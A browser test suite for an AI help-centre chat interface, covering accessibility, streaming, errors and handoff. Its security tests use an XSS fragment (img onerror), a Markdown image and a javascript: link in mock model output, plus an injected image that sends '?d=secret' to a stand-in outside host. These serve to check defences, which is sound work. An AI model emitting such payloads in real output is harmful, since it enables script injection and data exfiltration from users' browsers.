// Real Chromium, real keyboard events, real network to the mock server. This is
// not a screen reader and not Safari or Firefox. See the lab README for the gaps.
import { after, afterEach, before, beforeEach, test } from "node:test";
import assert from "node:assert/strict";
import { resolve } from "node:path";
import type { Browser, BrowserContext, Page } from "playwright-core";
import { listen, root } from "./helpers.ts";
import { launch, runAxe } from "./browser-kit.ts";

const chat = process.env.APP_ENTRY ?? resolve(root, process.env.TARGET ?? "solutions", "Chat.tsx");
let m: Awaited<ReturnType<typeof listen>>;
let browser: Browser;
let context: BrowserContext;
let page: Page;
let problems: string[];

before(async () => {
  m = await listen(chat);
  browser = await launch();
});
after(async () => {
  await browser?.close();
  m?.server.closeAllConnections();
  m?.server.close();
});

async function open(query = "", contextOptions: Parameters<Browser["newContext"]>[0] = {}) {
  await context?.close();
  context = await browser.newContext(contextOptions);
  page = await context.newPage();
  page.setDefaultTimeout(Number(process.env.STEP_TIMEOUT_MS ?? 5000));
  problems = [];
  page.on("console", (msg) => { if (msg.type() === "error" && !msg.text().includes("Failed to load resource")) problems.push(msg.text()); });
  page.on("pageerror", (err) => problems.push(String(err)));
  await page.goto(`${m.url}/${query}`);
}

beforeEach(() => open());
afterEach(async () => {
  assert.deepEqual(problems, [], "no console errors, React warnings or uncaught exceptions");
});

async function ask(scenario: string, question = `question for ${scenario}`) {
  await page.selectOption("#scenario", scenario);
  await page.fill("textarea", question);
  await page.keyboard.press("Tab"); // leave the field so the helper needs no prior focus
  await page.focus("textarea");
  await page.keyboard.press("Enter");
}

const status = (text: string | RegExp) =>
  page.getByRole("status").filter({ hasText: text }).waitFor();
const alert = () => page.getByRole("alert");
const answer = () => page.locator(".answer").last();

async function assertAxeClean(label: string) {
  const r = await runAxe(page);
  assert.deepEqual(r.violations, [], `axe violations in ${label}`);
}

test("a complete answer: words, sources, status and an accessible page", async () => {
  await assertAxeClean("the idle page");
  await page.getByText(/can be wrong/).waitFor();
  await ask("answer");
  await status(/Answer complete, 2 sources/);
  assert.match(await answer().innerText(), /within 30 days \[1\]/);
  const links = page.getByRole("list").getByRole("link");
  assert.equal(await links.count(), 2, "the retrieved but unused source is not listed");
  assert.match((await links.first().getAttribute("href"))!, /\/docs\/refunds#window$/);
  assert.match((await links.first().textContent())!, /refunds \(opens in a new tab\)/);
  assert.equal(await page.locator("article blockquote").first().innerText(), "Annual plans can be refunded in full within 30 days of purchase.");
  await assertAxeClean("a complete answer");
});

test("an inline marker jumps to its source", async () => {
  await ask("answer");
  await status(/Answer complete/);
  await page.getByRole("link", { name: "Source 2" }).click();
  assert.equal(await page.evaluate(() => document.querySelector(":target")?.querySelector("blockquote")?.textContent), "Monthly plans are not refunded, but they can be cancelled at any time.");
});

test("the source link opens the passage it quotes", async () => {
  await ask("answer");
  await status(/Answer complete/);
  const [popup] = await Promise.all([context.waitForEvent("page"), page.locator("ol a").first().click()]);
  await popup.waitForLoadState();
  assert.match(await popup.locator("#window").innerText(), /within 30 days/);
  assert.equal(await popup.evaluate(() => window.opener), null, "the opened page gets no handle on this one");
});

test("streaming is not announced word by word", async () => {
  await page.evaluate(() => {
    const w = window as unknown as { __status: string[] };
    w.__status = [];
    new MutationObserver(() => {
      w.__status.push(document.querySelector('[role="status"]')!.textContent!);
    }).observe(document.querySelector('[role="status"]')!, { childList: true, characterData: true, subtree: true });
  });
  await ask("answer");
  await status(/Answer complete/);
  const seen = await page.evaluate(() => (window as unknown as { __status: string[] }).__status);
  const words = (await answer().innerText()).split(/\s+/).length;
  console.log(`status region changed ${seen.length} times for an answer of ${words} words`);
  assert.ok(seen.length <= 4, `status changed ${seen.length} times: ${seen.join(" | ")}`);
  assert.ok(words > 15, `the answer has ${words} words`);
  const live = await page.evaluate(() => {
    const el = document.querySelector(".answer")!;
    return el.closest('[aria-live],[role="log"],[role="status"],[role="alert"]') !== null;
  });
  assert.equal(live, false, "the answer text is outside every live region");
});

test("the status region exists, empty, before anything happens", async () => {
  assert.equal(await page.getByRole("status").count(), 1);
  assert.equal(await page.getByRole("status").textContent(), "");
});

test("aria-busy is true while streaming and false after", async () => {
  await ask("long");
  await page.locator('article[aria-busy="true"]').waitFor();
  await status(/Answer complete/);
  await page.locator('article[aria-busy="false"]').waitFor();
  assert.equal(await page.locator(".caret").count(), 0);
});

test("axe stays clean in the middle of a stream", async () => {
  await ask("long");
  await page.locator('article[aria-busy="true"]').waitFor();
  await assertAxeClean("a streaming answer");
});

test("weak evidence says so in words, and offers a person", async () => {
  await ask("uncertain");
  await status(/with a warning/);
  await page.getByText(/Weak evidence/).waitFor();
  await page.getByRole("button", { name: "Ask a person" }).waitFor();
  await assertAxeClean("the uncertain state");
});

test("every finished state offers a person, including a complete answer", async () => {
  for (const scenario of ["answer", "no-evidence", "truncated", "refusal", "mid-stream-error", "busy-always"]) {
    await ask(scenario);
    await page.getByRole("button", { name: "Ask a person" }).waitFor();
  }
});

test("no evidence is not shown as an answer", async () => {
  await ask("no-evidence");
  await page.getByText(/No answer found/).waitFor();
  assert.equal(await page.locator("ol").count(), 0, "no source list is invented");
});

test("a citation marker with no source is marked unverified", async () => {
  await ask("dangling-citation");
  await page.getByText(/no source behind it/).waitFor();
  assert.match(await page.locator(".unverified").innerText(), /\[4\] unverified/);
  assert.equal(await page.getByRole("link", { name: "Source 4" }).count(), 0);
  assert.equal(await page.getByRole("link", { name: "Source 1" }).count(), 1);
});

test("truncated and refused answers are labelled and do not claim completion", async () => {
  await ask("truncated");
  await page.getByText(/Cut off at the length limit\. This answer is incomplete/).waitFor();
  assert.ok(await page.getByRole("button", { name: "Retry" }).isVisible());
  await ask("refusal");
  await page.getByText(/outside what the assistant can help with/).waitFor();
  assert.equal(await page.getByRole("button", { name: "Retry" }).count(), 0, "retrying a refusal is pointless");
});

test("an error before the stream explains itself and Retry recovers", async () => {
  await ask("busy-once", "the same question");
  await alert().filter({ hasText: /busy/ }).waitFor();
  const words = await alert().innerText();
  assert.match(words, /Try again in about 2 seconds/);
  assert.doesNotMatch(words, /503|overloaded|error/i, "plain words, no codes");
  await assertAxeClean("the error state");
  await page.getByRole("button", { name: "Retry" }).click();
  await status(/Answer complete/);
  assert.equal(await page.getByRole("heading", { level: 2, name: "the same question" }).count(), 1, "a retry replaces the failed attempt");
  assert.equal(await page.evaluate(() => document.activeElement?.tagName), "TEXTAREA");
});

test("an error after a 200 keeps the partial text and labels it", async () => {
  await ask("mid-stream-error");
  await alert().filter({ hasText: /failed partway/ }).waitFor();
  assert.match(await answer().innerText(), /refunded in full/);
  await page.getByText(/Incomplete\. This text was written before the failure/).waitFor();
  await assertAxeClean("a mid-stream failure");
});

test("a 500 before any text is not described as failing partway", async () => {
  await ask("server-error");
  await alert().filter({ hasText: /hit an error while answering/ }).waitFor();
  assert.equal(await alert().filter({ hasText: /partway/ }).count(), 0);
  await assertAxeClean("a server error before streaming");
});

test("a dropped connection and a clean end with no terminal event both fail visibly", async () => {
  for (const scenario of ["dropped", "clean-eof"]) {
    await ask(scenario);
    await alert().filter({ hasText: /lost before the answer finished/ }).waitFor();
    assert.match(await answer().innerText(), /Annual plans can be/);
    assert.equal(await page.getByRole("status").filter({ hasText: /complete/ }).count(), 0, scenario);
  }
});

test("a proxy's HTML page sent as a 200 is not rendered as an answer", async () => {
  await ask("proxy-login-page");
  await alert().filter({ hasText: /something other than an answer/ }).waitFor();
  assert.equal(await page.getByText("Corporate proxy sign-in").count(), 0);
});

test("a silent connection is given up on", async () => {
  await open("?stallMs=200");
  await ask("stalled");
  await alert().filter({ hasText: /No response for a while/ }).waitFor();
  assert.match(await answer().innerText(), /Annual plans/);
});

test("a slow first token gets a second message, and keep-alives hold off the watchdog", async () => {
  await open("?slowMs=200&stallMs=800");
  await ask("slow-start");
  await status(/Searching the help centre/);
  await status(/Still working/);
  await status(/Answer complete/);
});

test("Stop keeps the partial text, reaches the server and returns focus", async () => {
  await ask("long");
  await page.locator(".answer").filter({ hasText: "Paragraph 3" }).waitFor();
  await page.getByRole("button", { name: "Stop" }).click();
  await status(/Stopped/);
  const kept = await answer().innerText();
  assert.match(kept, /Paragraph 3/);
  await page.getByText(/This answer is incomplete/).waitFor();
  assert.equal(await page.evaluate(() => document.activeElement?.tagName), "TEXTAREA", "focus moved off the button that changed meaning");
  await new Promise((r) => setTimeout(r, 100));
  assert.equal(m.stats.lastClientGone, true, "the server saw the client leave");
  const written = m.stats.lastDeltasWritten;
  assert.ok(written < 60, `the server stopped at delta ${written} of 60`);
  await new Promise((r) => setTimeout(r, 100));
  assert.equal(m.stats.lastDeltasWritten, written, "nothing more was produced");
  assert.equal(await answer().innerText(), kept);
});

test("the keyboard alone can ask, stop, retry, reach a source and hand off", async () => {
  await page.keyboard.press("Tab");
  assert.equal(await page.evaluate(() => document.activeElement?.tagName), "TEXTAREA");
  await page.keyboard.type("first line");
  await page.keyboard.press("Shift+Enter");
  await page.keyboard.type("second line");
  assert.equal(await page.locator("textarea").inputValue(), "first line\nsecond line");

  await page.selectOption("#scenario", "long");
  await page.focus("textarea");
  await page.keyboard.press("Enter");
  await page.locator(".answer").filter({ hasText: "Paragraph 2" }).waitFor();
  await page.keyboard.press("Escape");
  await status(/Stopped/);

  const stops: string[] = [];
  for (let i = 0; i < 12; i++) {
    await page.keyboard.press("Shift+Tab");
    const [name, outline] = await page.evaluate(() => {
      const el = document.activeElement as HTMLElement;
      return [el.textContent?.trim().slice(0, 30) ?? "", getComputedStyle(el).outlineStyle];
    });
    stops.push(name!);
    assert.notEqual(outline, "none", `focus on "${name}" is visible`);
    if (name === "Retry") break;
  }
  assert.ok(stops.includes("Ask a person"), stops.join(" | "));
  assert.ok(stops.includes("Retry"), stops.join(" | "));
  await page.keyboard.press("Enter");
  await page.locator(".answer").filter({ hasText: "Paragraph 60" }).waitFor();
  await status(/Answer complete/);
});

test("Send and Stop are real buttons: Space and Enter work when they have focus", async () => {
  await page.selectOption("#scenario", "long");
  await page.fill("textarea", "by button");
  await page.getByRole("button", { name: "Send" }).focus();
  await page.keyboard.press("Enter");
  await page.locator(".answer").filter({ hasText: "Paragraph 2" }).waitFor();
  assert.equal(await page.evaluate(() => document.activeElement?.tagName), "TEXTAREA", "focus left the button that became Stop");
  await page.getByRole("button", { name: "Stop" }).focus();
  await page.keyboard.press("Space");
  await status(/Stopped/);
});

test("no focusable element is lost to the body as states change", async () => {
  await ask("mid-stream-error");
  await alert().waitFor();
  await page.getByRole("button", { name: "Edit question" }).click();
  assert.equal(await page.evaluate(() => document.activeElement?.tagName), "TEXTAREA");
  assert.equal(await page.locator("textarea").inputValue(), "question for mid-stream-error", "the question comes back to edit");
});

test("model output cannot run script, load an image or make a link", async () => {
  const outside: string[] = [];
  page.on("request", (r) => { if (r.url().includes("outside.example")) outside.push(r.url()); });
  await ask("untrusted");
  await status(/Answer complete/);
  const text = await answer().innerText();
  assert.match(text, /<img src="x" onerror=/, "the markup shows as text");
  assert.match(text, /!\[status\]\(https:\/\/outside\.example/, "the Markdown image shows as text");
  assert.equal(await page.locator("article img").count(), 0);
  assert.equal(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned), undefined);
  assert.equal(await page.locator('a[href*="outside.example"]').count(), 0);
  assert.deepEqual(outside, [], "the browser made no request to the outside host");
  await assertAxeClean("untrusted content");
});

test("a javascript: citation is shown as text, not as a link", async () => {
  await ask("untrusted");
  await status(/Answer complete/);
  assert.equal(await page.locator('a[href^="javascript"]').count(), 0);
  await page.getByText(/Click to verify \(link removed/).waitFor();
});

test("the content security policy blocks an injected outbound image", async () => {
  const violation = await page.evaluate(() => new Promise<string>((res) => {
    document.addEventListener("securitypolicyviolation", (e) => res(e.effectiveDirective));
    const img = document.createElement("img");
    img.src = "https://outside.example/x.png?d=secret";
    document.body.append(img);
  }));
  assert.equal(violation, "img-src");
  problems = problems.filter((p) => !p.includes("Content Security Policy")); // the block is the point here
});

test("at 320 px wide nothing needs a horizontal scroll, even with a long token", async () => {
  await open("", { viewport: { width: 320, height: 640 } });
  await ask("untrusted");
  await status(/Answer complete/);
  const [scrollW, innerW] = await page.evaluate(() => [document.documentElement.scrollWidth, window.innerWidth]);
  assert.ok(scrollW! <= innerW!, `scrollWidth ${scrollW} against viewport ${innerW}`);
});

test("reduced motion stops the caret animating", async () => {
  const read = () => page.locator(".caret").evaluate((el) => getComputedStyle(el).animationName);
  await ask("long");
  await page.locator(".caret").waitFor();
  assert.equal(await read(), "blink");
  await open("", { reducedMotion: "reduce" });
  await ask("long");
  await page.locator(".caret").waitFor();
  assert.equal(await read(), "none");
});

test("the page follows the stream, until the reader scrolls away", async () => {
  await open("", { viewport: { width: 800, height: 400 } });
  await ask("long");
  await page.locator(".answer").filter({ hasText: "Paragraph 20" }).waitFor();
  const followed = await page.evaluate(() => window.scrollY);
  assert.ok(followed > 0, `the page followed down to ${followed}`);
  await page.evaluate(() => window.scrollTo(0, 0));
  await page.locator(".answer").filter({ hasText: "Paragraph 40" }).waitFor();
  assert.equal(await page.evaluate(() => window.scrollY), 0, "the reader was left where they scrolled");
});

test("handoff sends the context, returns a reference and says what was shared", async () => {
  await ask("answer", "an earlier question");
  await status(/Answer complete/);
  await ask("uncertain", "the hard question");
  await status(/with a warning/);
  await page.getByRole("heading", { level: 2, name: "an earlier question" }).waitFor();
  await page.getByRole("button", { name: "Ask a person" }).click();
  await page.getByText(/no need to repeat/).waitFor();
  await status(/Sent to support, reference H-\d+/);
  assert.equal(await page.evaluate(() => document.activeElement?.tagName), "TEXTAREA", "focus did not fall to body");
  const sent = m.stats.handoffs.at(-1) as { question: string; answer: string; status: string; citations: unknown[]; earlier: { question: string }[] };
  assert.equal(sent.question, "the hard question");
  assert.match(sent.answer, /appears to stay valid/);
  assert.equal(sent.status, "uncertain");
  assert.equal(sent.citations.length, 1);
  assert.equal(sent.earlier[0]!.question, "an earlier question");
  await assertAxeClean("after a handoff");
});

test("a handoff carries only the sources the answer used", async () => {
  await ask("answer");
  await status(/Answer complete, 2 sources/);
  await page.getByRole("button", { name: "Ask a person" }).click();
  await status(/Sent to support/);
  const sent = m.stats.handoffs.at(-1) as { citations: unknown[] };
  assert.equal(sent.citations.length, 2, "the retrieved but unused source is not sent");
});

test("a failed handoff says so and leaves another route", async () => {
  await ask("handoff-down");
  await status(/with a warning/);
  await page.getByRole("button", { name: "Ask a person" }).click();
  await alert().filter({ hasText: /did not reach support/ }).waitFor();
  assert.match((await page.getByRole("link", { name: "support@harbour.example" }).getAttribute("href"))!, /^mailto:/);
  await page.getByRole("button", { name: "Try support again" }).waitFor();
});

test("the accessibility tree names every control", async () => {
  const snapshot = await page.locator("main").ariaSnapshot();
  for (const want of ['heading "Harbour help"', 'textbox "Your question"', 'combobox "Mock scenario (lab only)"', 'button "Send"']) {
    assert.ok(snapshot.includes(want), `missing ${want} in:\n${snapshot}`);
  }
});

test("an error that retrying cannot fix offers no Retry", async () => {
  await page.evaluate(() => {
    const select = document.querySelector("#scenario") as HTMLSelectElement;
    select.add(new Option("no-such-scenario", "no-such-scenario"));
  });
  await ask("no-such-scenario");
  await alert().waitFor();
  assert.equal(await page.getByRole("button", { name: "Retry" }).count(), 0);
});
